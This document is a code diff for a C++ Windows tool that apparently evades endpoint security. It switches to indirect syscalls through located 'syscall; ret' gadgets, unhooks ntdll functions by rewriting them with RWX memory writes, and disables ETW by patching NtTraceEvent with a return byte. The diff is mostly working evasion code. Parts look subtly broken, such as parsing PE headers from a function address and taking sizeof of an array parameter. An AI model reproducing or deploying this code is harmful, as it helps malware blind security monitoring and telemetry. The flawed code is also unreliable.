@@ -266,52 +266,81 @@ PVOID GetAddress(std::string functionName) {
     return 00;
 }
 
-uintptr_t FindSyscallOffset() noexcept {
+uintptr_t FindSyscallOffset(std::string funcName) noexcept {
     INT64 offset = 0;
     BYTE signature[] = { 0x0F, 0x05, 0xC3 };
 
-    uintptr_t hNtdll = reinterpret_cast<uintptr_t>(GetModuleBaseAddress(L"ntdll.dll"));
-    PIMAGE_DOS_HEADER pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hNtdll);
-    PIMAGE_NT_HEADERS pNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<BYTE*>(hNtdll) + pDosHeader->e_lfanew);
-    INT64 pDllSize = (pNtHeaders->OptionalHeader.SizeOfImage);
-    BYTE* currentbytes = (BYTE*)hNtdll;
+    uintptr_t pFunc = reinterpret_cast<uintptr_t>(GetAddress(funcName));
+    PIMAGE_DOS_HEADER pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(pFunc);
+    PIMAGE_NT_HEADERS pNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<BYTE*>(pFunc) + pDosHeader->e_lfanew);
+    INT64 pSize = (pNtHeaders->OptionalHeader.SizeOfImage);
+    BYTE* currentbytes = (BYTE*)pFunc;
 
-    while (TRUE)
+    for (;;)
     {
         if (*(reinterpret_cast<BYTE*>(currentbytes)) == signature[0] &&
             *(reinterpret_cast<BYTE*>(currentbytes + 1)) == signature[1] &&
             *(reinterpret_cast<BYTE*>(currentbytes + 2)) == signature[2])
         {
-            return hNtdll + offset;
+            return pFunc + offset;
         }
         offset++;
-        if (offset + 3 > pDllSize)
+        if (offset + 3 > pSize)
             return INFINITE;
-        currentbytes = reinterpret_cast<BYTE*>(hNtdll + offset);
+        currentbytes = reinterpret_cast<BYTE*>(pFunc + offset);
     }
 }
 
-void Unhook(std::string funcName, BYTE code[]) {
+BOOL Unhook(std::string funcName, BYTE code[]) {
+    std::cout << "[*] Unhooking function " << funcName << "..." << std::endl;
+    uintptr_t jmpNtPVM = FindSyscallOffset("NtProtectVirtualMemory");
+    uintptr_t jmpNtWVM = FindSyscallOffset("NtWriteVirtualMemory");
     int NtPVM = GetSyscall("NtProtectVirtualMemory");
     int NtWVM = GetSyscall("NtWriteVirtualMemory");
     PVOID addr = GetAddress(funcName);
+
     PVOID pAddr = addr;
     SIZE_T regionSize = 4096;
     SIZE_T codeSize = sizeof(code);
     ULONG protect, oldProtect;
-
-    NtProtectVirtualMemory(NtCurrentProcess(), &addr, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect, NtPVM);
-    NtWriteVirtualMemory(NtCurrentProcess(), pAddr, code, codeSize, NULL, NtWVM);
-    NtProtectVirtualMemory(NtCurrentProcess(), &addr, &regionSize, oldProtect, &protect, NtPVM);
-
-    return;
+    NTSTATUS status = NULL;
+    
+    // Prepare indirect syscall
+    SetJumpAddress(jmpNtPVM);
+    // Enable RWX permissions to allow overwriting
+    status = NtProtectVirtualMemory(NtCurrentProcess(), &addr, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect, NtPVM);
+    if (!NT_SUCCESS(status)) {
+        std::cout << "[-] NtProtectVirtualMemory failed. Status code: 0x" << std::hex << status << std::endl;
+        return FALSE;
+    }
+    std::cout << "  [+] NtProtectVirtualMemory success!" << std::endl;
+    
+    // Prepare indirect syscall
+    SetJumpAddress(jmpNtWVM);
+    // Repatch opcode
+    status = NtWriteVirtualMemory(NtCurrentProcess(), pAddr, code, codeSize, NULL, NtWVM);
+    if (!NT_SUCCESS(status)) {
+        std::cout << "[-] NtWriteVirtualMemory failed. Status code: 0x" << std::hex << status << std::endl;
+        return FALSE;
+    }
+    std::cout << "  [+] NtWriteVirtualMemory success!" << std::endl;
+    
+    // Prepare indirect syscall
+    SetJumpAddress(jmpNtPVM);
+    // Revert memory protection
+    status = NtProtectVirtualMemory(NtCurrentProcess(), &addr, &regionSize, oldProtect, &protect, NtPVM);
+    if (!NT_SUCCESS(status)) {
+        std::cout << "[-] NtProtectVirtualMemory failed. Status code: 0x" << std::hex << status << std::endl;
+        return FALSE;
+    }
+    std::cout << "  [+] NtProtectVirtualMemory success!" << std::endl;
+    
+    std::cout << "[+] " << funcName << " Unhooked!" << std::endl;
+    return TRUE;
 }
 
 int main() {
     ParseNtdllEAT();
-
-    uintptr_t jumpAddress = FindSyscallOffset();
-    SetJumpAddress(jumpAddress);
 
     // Patch ETW by disabling NtTraceEvent
     BYTE patch[] = { 0xc3 };
